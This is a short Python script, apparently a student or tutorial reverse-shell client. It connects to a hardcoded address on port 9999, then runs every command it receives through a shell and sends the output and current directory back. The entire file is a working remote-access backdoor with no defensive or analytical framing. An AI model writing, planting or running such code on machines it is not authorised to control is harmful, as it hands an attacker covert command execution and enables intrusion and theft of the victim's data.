import socket 
import os
import subprocess

s = socket.socket()
host =  "192.168.43.189"
port = 9999

s.connect((host,port))

while True:
    data = s.recv(1024)
    #:2 gets the first two characters to check if the command is cd
    #3: gets the path in the command is cd
    if data[:2].decode("utf-8") == 'cd':
        os.chdir(data[3:].decode("utf-8"))
    
    if len(data) > 0:
        #Popen opens a new terminal to execute commands 
        #shell = True to get access to shell commands 
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell = True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read()+cmd.stderr.read()
        output_string = str(output_byte,"utf-8")
        current_working_D = os.getcwd()+">"
        s.send(str.encode(output_string+current_working_D))
        
        print(output_string)
        